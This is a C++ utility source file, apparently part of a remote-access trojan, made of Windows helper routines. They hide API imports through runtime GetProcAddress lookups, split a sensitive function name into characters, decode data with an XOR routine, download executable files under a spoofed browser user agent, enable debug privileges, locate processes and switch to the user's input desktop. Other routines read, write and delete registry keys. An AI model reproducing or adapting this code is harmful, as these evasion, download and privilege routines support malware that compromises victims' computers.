#if !defined(AFX_UNTIL_CPP_INCLUDED)
#define AFX_UNTIL_CPP_INCLUDED
#include <windows.h>
#include <process.h>
#include <tlhelp32.h>
#include <wininet.h>
#include "until.h"
 
unsigned int __stdcall ThreadLoader(LPVOID param)
{
	unsigned int	nRet = 0;
#if _DLL
 	try
 	{	
#endif
		THREAD_ARGLIST	arg;
		memcpy(&arg, param, sizeof(arg));
		SetEvent(arg.hEventTransferArg);
		// 与卓面交互
		if (arg.bInteractive)
			SelectDesktop(NULL);
		nRet = arg.start_address(arg.arglist);
#if _DLL
	}catch(...){};
#endif
	return nRet;
}
//////////

typedef HANDLE
(WINAPI
 *CreateToolhelp32SnapshotT)(
 DWORD dwFlags,
 DWORD th32ProcessID
 );

DWORD GetProcessID(LPCTSTR lpProcessName)
{
	DWORD RetProcessID = 0;
	CreateToolhelp32SnapshotT pCreateToolhelp32Snapshot=(CreateToolhelp32SnapshotT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"CreateToolhelp32Snapshot");
	HANDLE handle=pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32* info=new PROCESSENTRY32;
	info->dwSize=sizeof(PROCESSENTRY32);
	
	if(Process32First(handle,info))
	{
		if (strcmpi(info->szExeFile,lpProcessName) == 0)
		{
			RetProcessID = info->th32ProcessID;
			return RetProcessID;
		}
		while(Process32Next(handle,info) != FALSE)
		{
			if (lstrcmpi(info->szExeFile,lpProcessName) == 0)
			{
				RetProcessID = info->th32ProcessID;
				return RetProcessID;
			}
		}
	}
	return RetProcessID;
}

HANDLE MyCreateThread (LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
					   SIZE_T dwStackSize,                       // initial stack size
					   LPTHREAD_START_ROUTINE lpStartAddress,    // thread function
					   LPVOID lpParameter,                       // thread argument
					   DWORD dwCreationFlags,                    // creation option
					   LPDWORD lpThreadId,
					   bool bInteractive)

{
	HANDLE	hThread = INVALID_HANDLE_VALUE;
	THREAD_ARGLIST	arg;
	arg.start_address = (unsigned ( __stdcall *)( void * ))lpStartAddress;
	arg.arglist = (void *)lpParameter;
	arg.hEventTransferArg = CreateEvent(NULL, false, false, NULL);
	hThread = (HANDLE)_beginthreadex((void *)lpThreadAttributes, dwStackSize, ThreadLoader, &arg, dwCreationFlags, (unsigned *)lpThreadId);
	WaitForSingleObject(arg.hEventTransferArg, INFINITE);
	CloseHandle(arg.hEventTransferArg);
	
	return hThread;
}
char* MyDecode(char *data,int len)
{
	for (int i = 0; i < len; i++)
	{
		data[i] += 0x86;
		data[i] ^= 0x19;
	}
	return data;
}

BOOL SelectHDESK(HDESK new_desktop)
{
	//////////////////////////////////////////////////////////////////////////
	HINSTANCE user32 = LoadLibrary("user32.dll");
	
	typedef HDESK (WINAPI *TGetThreadDesktop)(DWORD); 
	typedef BOOL (WINAPI *TGetUserObjectInformationA)(HANDLE,int,PVOID,DWORD,LPDWORD); 
	typedef BOOL (WINAPI *TSetThreadDesktop)(HDESK); 
	typedef BOOL (WINAPI *TCloseDesktop)(HDESK); 
	
	TGetThreadDesktop MyGetThreadDesktop= (TGetThreadDesktop)GetProcAddress(user32, "GetThreadDesktop"); 
	TGetUserObjectInformationA MyGetUserObjectInformation= (TGetUserObjectInformationA)GetProcAddress(user32, "GetUserObjectInformationA");
	TSetThreadDesktop MySetThreadDesktop= (TSetThreadDesktop)GetProcAddress(user32, "SetThreadDesktop");
	TCloseDesktop MyCloseDesktop= (TCloseDesktop)GetProcAddress(user32, "CloseDesktop"); 


	HINSTANCE kernel32 = LoadLibrary("kernel32.dll"); 
	typedef DWORD (WINAPI *TGetCurrentThreadId)(VOID); 
	TGetCurrentThreadId MyGetCurrentThreadId= (TGetCurrentThreadId)GetProcAddress(kernel32, "GetCurrentThreadId"); 

	//////////////////////////////////////////////////////////////////////////

	HDESK old_desktop = MyGetThreadDesktop(MyGetCurrentThreadId());
	
	DWORD dummy;
	char new_name[256];

	BOOL   iResult = TRUE;
	__try
	{
		
		if (!MyGetUserObjectInformation(new_desktop, UOI_NAME, &new_name, 256, &dummy))
		{
			iResult = FALSE;
			__leave;
		}
		
		// Switch the desktop
		if(!MySetThreadDesktop(new_desktop)) 
		{
			iResult = FALSE;
			__leave;
		}
		
		// Switched successfully - destroy the old desktop
		MyCloseDesktop(old_desktop);

	}__finally
	{
		if(user32)
			FreeLibrary(user32);

		if (kernel32)
			FreeLibrary(kernel32);
	}
	
	return iResult;
}

BOOL SelectDesktop(TCHAR *name)
{
	//////////////////////////////////////////////////////////////////////////
	HINSTANCE user32 = LoadLibrary("user32.dll");
	
	typedef HDESK (WINAPI *TOpenDesktopA)(LPCSTR,DWORD,BOOL,ACCESS_MASK); 
	typedef HDESK (WINAPI *TOpenInputDesktop)(DWORD,BOOL,ACCESS_MASK); 
	typedef BOOL (WINAPI *TCloseDesktop)(HDESK); 
	
	char HghHa[] = {'O','p','e','n','I','n','p','u','t','D','e','s','k','t','o','p','\0'};

	TOpenInputDesktop MyOpenInputDesktop= (TOpenInputDesktop)GetProcAddress(user32, HghHa); 
	TOpenDesktopA MyOpenDesktop= (TOpenDesktopA)GetProcAddress(user32, "OpenDesktopA"); 
	TCloseDesktop MyCloseDesktop= (TCloseDesktop)GetProcAddress(user32, "CloseDesktop"); 
	//////////////////////////////////////////////////////////////////////////
	HDESK desktop;
	
	BOOL   iResult = TRUE;
	__try
	{
		
		if (name != NULL)
		{
			// Attempt to open the named desktop
			desktop = MyOpenDesktop(name, 0, FALSE,0x1FF);
		}
		else
		{
			// No, so open the input desktop
			desktop = MyOpenInputDesktop(0, FALSE,0x1FF);
		}
		
		// Did we succeed?
		if (desktop == NULL) 
		{
			iResult = FALSE;
			__leave;
		}
		
		// Switch to the new desktop
		if (!SelectHDESK(desktop)) 
		{
			// Failed to enter the new desktop, so free it!
			MyCloseDesktop(desktop);
			iResult =  FALSE;
			__leave;
		}
	}__finally
	{
		if(user32)
			FreeLibrary(user32);
	}
	return iResult;
}


bool http_get(LPCTSTR szURL, LPCTSTR szFileName)
{
	HINTERNET	hInternet = NULL, hUrl = NULL;
	HANDLE		hFile;
	TCHAR		buffer[1024];
	DWORD		dwBytesRead = 0;
	DWORD		dwBytesWritten = 0;
	BOOL		bIsFirstPacket = true;
	bool		bRet = true;

	HINSTANCE hdlldes = LoadLibrary("wininet.dll"); 
	
	typedef HINTERNET (WINAPI *NETOPEN)(LPCTSTR ,DWORD, LPCTSTR, LPCTSTR ,DWORD) ; 
	NETOPEN myNetOpen= (NETOPEN)GetProcAddress(hdlldes, "InternetOpenA");

	hInternet = myNetOpen("MSIE 6.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL,INTERNET_INVALID_PORT_NUMBER,0);


	if (hInternet == NULL)
	{
		if(hdlldes)
			FreeLibrary(hdlldes);
		return false;
	}
	
	typedef HINTERNET (WINAPI *NETOPENURL)(HINTERNET ,LPCTSTR ,LPCTSTR ,DWORD ,DWORD ,DWORD_PTR ); 
	NETOPENURL 	myNetOpenUrl= (NETOPENURL)GetProcAddress(hdlldes, "InternetOpenUrlA");
	
	hUrl = myNetOpenUrl(hInternet, szURL, NULL, 0, INTERNET_FLAG_RELOAD, 0);
	
	if (hUrl == NULL)
	{
		if(hdlldes)
			FreeLibrary(hdlldes);
		return false;
	}
	hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);

	if (hFile != INVALID_HANDLE_VALUE)
	{
		do
		{
			memset(buffer, 0, sizeof(buffer));
			typedef BOOL (WINAPI *APIS)(HINTERNET ,LPVOID ,DWORD ,LPDWORD ); 
			APIS myapis; 
			myapis= (APIS)GetProcAddress(hdlldes, "InternetReadFile"); 
			myapis(hUrl, buffer, sizeof(buffer), &dwBytesRead);
			
			// 由判断第一个数据包是不是有效的PE文件
			if (bIsFirstPacket && ((PIMAGE_DOS_HEADER)buffer)->e_magic != IMAGE_DOS_SIGNATURE)
			{
				bRet = false;
				break;
			}
			bIsFirstPacket = false;
			
			WriteFile(hFile, buffer, dwBytesRead, &dwBytesWritten, NULL);
		} while(dwBytesRead > 0);
		CloseHandle(hFile);
	}


	Sleep(1);
	typedef BOOL (WINAPI *NETCLOSE)(HINTERNET hInternet); 
	NETCLOSE  myNetClose= (NETCLOSE  )GetProcAddress(hdlldes,"InternetCloseHandle"); 
	
	myNetClose(hUrl);
	myNetClose(hInternet);

	if(hdlldes)
		FreeLibrary(hdlldes);
	
	return bRet;
}

BOOL DebugPrivilege(const char *PName,BOOL bEnable)
{
	bool              bResult = TRUE;
	HANDLE            hToken;
	TOKEN_PRIVILEGES  TokenPrivileges;
	
	
	HINSTANCE advapi32 = LoadLibrary("ADVAPI32.dll"); 
	
	typedef BOOL (WINAPI *OPT)(HANDLE ProcessHandle,DWORD DesiredAccess,PHANDLE TokenHandle); 
	OPT myopt; 
	myopt= (OPT)GetProcAddress(advapi32, "OpenProcessToken"); 
	
	typedef BOOL (WINAPI *ATP)(HANDLE TokenHandle,BOOL DisableAllPrivileges,PTOKEN_PRIVILEGES NewState,DWORD BufferLength,PTOKEN_PRIVILEGES PreviousState,PDWORD ReturnLength); 
	ATP myapt; 
	myapt= (ATP)GetProcAddress(advapi32, "AdjustTokenPrivileges");
	
	typedef BOOL (WINAPI *LPV)(LPCTSTR lpSystemName, LPCTSTR lpName,PLUID lpLuid); 
	LPV mylpv;
#ifdef UNICODE
	mylpv= (LPV)GetProcAddress(advapi32, "LookupPrivilegeValueW");
#else
	mylpv= (LPV)GetProcAddress(advapi32, "LookupPrivilegeValueA");
#endif
	
	HINSTANCE kernel32 = LoadLibrary("kernel32.dll"); 
	typedef HANDLE (WINAPI *TGetCurrentProcess)(VOID); 
	TGetCurrentProcess myGetCurrentProcess = (TGetCurrentProcess)GetProcAddress(kernel32, "GetCurrentProcess"); 
	
	
	if (!myopt(myGetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		bResult = FALSE;
		return bResult;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
	
	
	mylpv(NULL, PName, &TokenPrivileges.Privileges[0].Luid);
	
	myapt(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	
	typedef int (WINAPI *GLE)(void); 
	GLE myGetLastError; 
	HINSTANCE hdlxxe = LoadLibrary("KERNEL32.dll"); 
	myGetLastError= (GLE)GetProcAddress(hdlxxe, "GetLastError"); 
	
    if (myGetLastError() != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}
	
	CloseHandle(hToken);
	if(advapi32)
		FreeLibrary(advapi32);
	if(kernel32)
		FreeLibrary(kernel32);
	return bResult;	
}

#include <STDIO.H>
int WriteToLog(char* str)
{
	FILE* log;
	log=fopen("C:\\2.txt","a+");
	if (log==NULL)
		return -1;
	fprintf(log,"%s\n",str);
	fclose(log);
	return 0;
}


BOOL EnumProcesin(LPTSTR lpProcessName)
{
	typedef BOOL (WINAPI *TProcess32First)(HANDLE ,LPPROCESSENTRY32); 
	typedef BOOL (WINAPI *TProcess32Next)(HANDLE ,LPPROCESSENTRY32); 
	
	typedef HANDLE (WINAPI *TCreateToolhelp32Snapshot)(DWORD ,DWORD); 
	HINSTANCE kernel32 = LoadLibrary("kernel32.dll"); 
	TCreateToolhelp32Snapshot myCreateToolhelp32Snapshot = (TCreateToolhelp32Snapshot)GetProcAddress(kernel32, "CreateToolhelp32Snapshot"); 
	TProcess32First myProcess32First = (TProcess32First)GetProcAddress(kernel32, "Process32First"); 
	TProcess32Next myProcess32Next = (TProcess32Next)GetProcAddress(kernel32, "Process32Next"); 
	
	BOOL bFound = FALSE;
	PROCESSENTRY32 pe; 
	DWORD dwRet;
	HANDLE hSP = myCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	
	if (hSP)
	{
		pe.dwSize = sizeof( pe );
		
		for (dwRet = myProcess32First(hSP, &pe); dwRet; dwRet = myProcess32Next(hSP, &pe))
		{
			if (lstrcmpi( lpProcessName, pe.szExeFile) == 0)
			{
				bFound = TRUE;
				break;
			}
		}
		
	}
	CloseHandle(hSP);
	if(kernel32)
		FreeLibrary(kernel32);
	return bFound;
}

char *  my_strncat(char *dest,const char *source,int count)
{
	char *p = dest;
	while (*p) p++;
	while (count-- && (*p++ = *source++));
	*p = (char)'/0';
	return(dest);
}

//读取注册表的指定键的数据(Mode:0-读键值数据 1-牧举子键)
int  ReadRegEx(HKEY MainKey,LPCTSTR SubKey,LPCTSTR Vname,DWORD Type,char *szData,LPBYTE szBytes,DWORD lbSize,int Mode)
{  
	HKEY   hKey;  
	int    ValueDWORD,iResult=0;
	char*  PointStr;  
	char   KeyName[32],ValueSz[MAX_PATH],ValueTemp[MAX_PATH];	
	DWORD  szSize,dwIndex=0;	 

	memset(KeyName,0,sizeof(KeyName));
	memset(ValueSz,0,sizeof(ValueSz));
	memset(ValueTemp,0,sizeof(ValueTemp));

//////////////////////////////////////////////////////////////////////////
	HINSTANCE advapi32 = LoadLibrary("ADVAPI32.dll");

	typedef BOOL (WINAPI *TRegQueryValueExA)(HKEY ,LPCTSTR ,LPDWORD ,LPDWORD ,LPBYTE ,LPDWORD );
	typedef int (WINAPI *TRegOpenKeyExA)(HKEY ,LPCTSTR ,DWORD ,REGSAM ,PHKEY );
	typedef BOOL (WINAPI *TRegEnumValueA)(HKEY ,DWORD ,LPTSTR ,LPDWORD ,LPDWORD ,LPDWORD ,LPBYTE ,LPDWORD ); 
	typedef BOOL (WINAPI *TRegEnumKeyExA)(HKEY ,DWORD ,LPTSTR ,LPDWORD ,LPDWORD ,LPTSTR ,LPDWORD ,PFILETIME ); 
	typedef BOOL (WINAPI *TRegCloseKey)(HKEY ); 



	TRegQueryValueExA MyRegQueryValueEx = (TRegQueryValueExA)GetProcAddress(advapi32, "RegQueryValueExA");
	TRegOpenKeyExA MyRegOpenKeyEx = (TRegOpenKeyExA)GetProcAddress(advapi32, "RegOpenKeyExA");
	TRegEnumValueA MyRegEnumValue= (TRegEnumValueA)GetProcAddress(advapi32, "RegEnumValueA");
	TRegEnumKeyExA MyRegEnumKeyEx= (TRegEnumKeyExA)GetProcAddress(advapi32, "RegEnumKeyExA");
	TRegCloseKey MyRegCloseKey= (TRegCloseKey)GetProcAddress(advapi32, "RegCloseKey");
//////////////////////////////////////////////////////////////////////////
	__try
	{	    	
		if(MyRegOpenKeyEx(MainKey,SubKey,0,KEY_READ,&hKey) != ERROR_SUCCESS)
		{
            iResult = -1;
			__leave;
		}	
		switch(Mode)		 
		{
		case 0:
			switch(Type)
			{
			case REG_SZ:
			case REG_EXPAND_SZ:				 
				szSize = sizeof(ValueSz);
				if(MyRegQueryValueEx(hKey,Vname,NULL,&Type,(LPBYTE)ValueSz,&szSize) == ERROR_SUCCESS)
				{
					lstrcpy(szData,ValueSz);
					iResult =1;
				}
				break;
			case REG_MULTI_SZ:	
				szSize = sizeof(ValueSz);
				if(MyRegQueryValueEx(hKey,Vname,NULL,&Type,(LPBYTE)ValueSz,&szSize) == ERROR_SUCCESS)
				{
					for(PointStr = ValueSz; *PointStr; PointStr = strchr(PointStr,0)+1)//strchr
					{
						my_strncat(ValueTemp,PointStr,sizeof(ValueTemp));
					    my_strncat(ValueTemp," ",sizeof(ValueTemp));
					}
					lstrcpy(szData,ValueTemp);
					iResult =1;
				}
				break;				 			
			case REG_DWORD:
				szSize = sizeof(DWORD);

				if(MyRegQueryValueEx(hKey,Vname,NULL,&Type,(LPBYTE)&ValueDWORD,&szSize ) == ERROR_SUCCESS)						
				{
				wsprintf(szData,"%d",ValueDWORD);
					iResult =1;
				}
				break;
            case REG_BINARY:
                szSize = lbSize;
				
				if(MyRegQueryValueEx(hKey,Vname,NULL,&Type,szBytes,&szSize) == ERROR_SUCCESS)
				{
					wsprintf(szData,"%08X",Type);
					iResult =1;
				}
				break;
			}
			break;
		default:
			break;
		}
	}
	__finally
	{

        MyRegCloseKey(MainKey);
		MyRegCloseKey(hKey);
	}
	if(advapi32)
		FreeLibrary(advapi32);
	return iResult;
}

//写注册表的指定键的数据(Mode:0-新建键数据 1-设置键数据 2-删除指定键 3-删除指定键项)
int WriteRegEx(HKEY MainKey,LPCTSTR SubKey,LPCTSTR Vname,DWORD Type,char* szData,DWORD dwData,int Mode)
{
	HKEY  hKey; 
	DWORD dwDisposition;    
	int   iResult =0;
//////////////////////////////////////////////////////////////////////////
	HINSTANCE advapi32 = LoadLibrary("ADVAPI32.dll");

	typedef LONG (WINAPI *TRegCreateKeyExA)(HKEY ,LPCSTR ,DWORD ,LPSTR ,DWORD ,REGSAM ,LPSECURITY_ATTRIBUTES ,PHKEY ,LPDWORD ); 
	typedef LONG (WINAPI *TRegSetValueExA)(HKEY ,LPCSTR ,DWORD ,DWORD ,CONST BYTE *,DWORD ); 
	typedef LONG (WINAPI *TRegDeleteKeyA)(HKEY ,LPCSTR ); 
	typedef LONG (WINAPI *TRegDeleteValueA)(HKEY ,LPCSTR ); 
	typedef LONG (WINAPI *TRegOpenKeyExA)(HKEY ,LPCSTR ,DWORD ,REGSAM ,PHKEY ); 
	typedef LONG (WINAPI *TRegCloseKey)(HKEY ); 

	TRegCreateKeyExA MyRegCreateKeyEx= (TRegCreateKeyExA)GetProcAddress(advapi32, "RegCreateKeyExA");
	TRegSetValueExA MyRegSetValueEx = (TRegSetValueExA)GetProcAddress(advapi32, "RegSetValueExA");
	TRegDeleteKeyA MyRegDeleteKey = (TRegDeleteKeyA)GetProcAddress(advapi32, "RegDeleteKeyA");
	TRegDeleteValueA MyRegDeleteValue= (TRegDeleteValueA)GetProcAddress(advapi32, "RegDeleteValueA");
	TRegOpenKeyExA MyRegOpenKeyEx = (TRegOpenKeyExA)GetProcAddress(advapi32, "RegOpenKeyExA");
	TRegCloseKey MyRegCloseKey= (TRegCloseKey)GetProcAddress(advapi32, "RegCloseKey"); 
//////////////////////////////////////////////////////////////////////////

	
	__try
	{	
	//	SetKeySecurityEx(MainKey,Subkey,KEY_ALL_ACCESS);
		switch(Mode)		
		{			
		case 0:
			if(MyRegCreateKeyEx(MainKey,SubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,&dwDisposition) != ERROR_SUCCESS)
				__leave;		 
		case 1:	
			if(MyRegOpenKeyEx(MainKey,SubKey,0,KEY_READ|KEY_WRITE,&hKey) != ERROR_SUCCESS)	
				__leave;		 		 			 
			switch(Type)
			{		 
			case REG_SZ:		 
			case REG_EXPAND_SZ:	
			case REG_MULTI_SZ:
			if(MyRegSetValueEx(hKey,Vname,0,Type,(LPBYTE)szData,lstrlen(szData)+1) == ERROR_SUCCESS)
					iResult =1;	
				break;
		    case REG_DWORD:
                if(MyRegSetValueEx(hKey,Vname,0,Type,(LPBYTE)&dwData,sizeof(DWORD)) == ERROR_SUCCESS)  
		            iResult =1;	
			    break;
		    case REG_BINARY:
			    break;
			}
			break;				
		case 2:
            if(MyRegOpenKeyEx(MainKey,SubKey,NULL,KEY_READ|KEY_WRITE,&hKey) != ERROR_SUCCESS)				
				__leave;                
			if (MyRegDeleteKey(hKey,Vname) == ERROR_SUCCESS)		        
				iResult =1;
			break;		
		case 3:
            if(MyRegOpenKeyEx(MainKey,SubKey,NULL,KEY_READ|KEY_WRITE,&hKey) != ERROR_SUCCESS)	
				__leave;                
			if (MyRegDeleteValue(hKey,Vname) == ERROR_SUCCESS)	
				iResult =1;
			break;
		default:
			__leave;                

		}
	}
	__finally 
	{
	   MyRegCloseKey(MainKey);		
	   MyRegCloseKey(hKey);
	}
	if(advapi32)
		FreeLibrary(advapi32);
	return iResult;
}
BOOL CheckFileExist(LPCTSTR lpszPath)
{
	if ( GetFileAttributes(lpszPath) == 0xFFFFFFFF && GetLastError() == ERROR_FILE_NOT_FOUND ) {
		return FALSE;
	}else{
		return TRUE;
	}
}

#endif // !defined(AFX_UNTIL_CPP_INCLUDED)